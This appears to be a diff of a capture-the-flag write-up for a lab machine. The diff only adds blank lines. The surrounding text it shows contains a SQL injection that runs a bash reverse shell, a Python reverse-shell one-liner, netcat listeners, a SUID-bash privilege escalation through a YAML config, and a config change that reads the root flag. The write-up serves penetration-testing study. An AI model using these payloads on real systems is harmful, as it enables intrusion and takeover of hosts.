@@ -106,10 +106,12 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 #### Exploitation
 
 1. Start a reverse shell listener using netcat:
+   
     ```
     nc -lvnp 9002
     ```
 2. We can perform the SQL injection manually by setting the `sqlRaw` parameter to the following value:
+
     ```
     COPY cmd_exec FROM PROGRAM 'bash -c \"/bin/sh -i >& /dev/tcp/<your ip>/9002 0>&1\"';
     ```
@@ -124,6 +126,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 #### Searching for Vulnerabilities
 
 - `/etc/passwd` indicates that there are two user accounts with a home directory:
+    
     ```
     juno:x:1000:1000:juno:/home/juno:/bin/bash
     jovian:x:1001:1002:,,,:/home/jovian:/bin/bash
@@ -134,6 +137,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 #### Exploitation
 
 1. Edit `network-simulation.yml` so that a bash with SUID-bit set for `juno` will get created in `/tmp`:
+    
     ```yaml
     server:
         network_node_id: 0
@@ -159,6 +163,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 
 - `ss -tlp` shows that there are tcp ports `3000` and `8888` open locally
 - By using the SSH port forwarding feature, we can scan these ports using nmap:
+
     ```
     ssh -L 3000:localhost:3000 juno@10.10.11.216
     ssh -L 8888:localhost:8888 juno@10.10.11.216    
@@ -210,10 +215,12 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 1. When opening the Jupyter webinteface under `localhost:8888`, a token must be entered, which can be found in `/opt/solar-flares/logs/jupyter-2023-09-07-15.log`.
     - Token: `ecae914aaaf6c419b40775ad51f07e7d3aece17a93e7104`
 2. Start a reverse shell listener using netcat:
+    
     ```
     nc -lvnp 9002
     ```
 3. After entering the token, a new Jupyter notebook can be created and the payload for a reverse shell can be executed in a cell:
+    
     ```python
     import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your ip>",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
     ```
@@ -233,6 +240,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 
 1. A working configuration file can be found under `/usr/local/share/sattrack/config.json`, which can be copied to `/tmp/config.json`.
 2. We can modify the configuration file `/tmp/config.json` so that the program outputs the root flag:
+    
     ```json
     "tlesources": [
         "file:///root/root.txt",
